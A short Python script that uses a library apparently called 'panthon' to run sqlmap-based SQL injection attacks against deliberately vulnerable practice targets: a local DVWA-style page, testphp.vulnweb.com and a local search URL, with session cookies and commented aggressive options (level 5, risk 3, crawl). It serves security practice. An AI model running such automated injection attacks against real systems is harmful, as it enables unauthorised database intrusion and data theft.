from panthon import SQLInjectionAttack

sql_injection_attack = SQLInjectionAttack()
# target_url = "http://testphp.vulnweb.com/artists.php?artist=1"
# cookies="2f5db4132205f9974c03e2834841cb17, low"
target_url = "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#"
# cookies = "PHPSESSID=47ea56e7013b793318e3dcd9a20c5c5d;security=low"
# target_url="http://localhost:3000/#/search?q=1"
sql_injection_attack.sqlmap_attack(
    target_url, cookies="PHPSESSID=1eccdf95db5e6f0fc8eb7282ced24055;security=low"
)
# sql_injection_attack.sqlmap_attack(target_url=target_url, crawl =True,level=5, risk=3, batch=True)
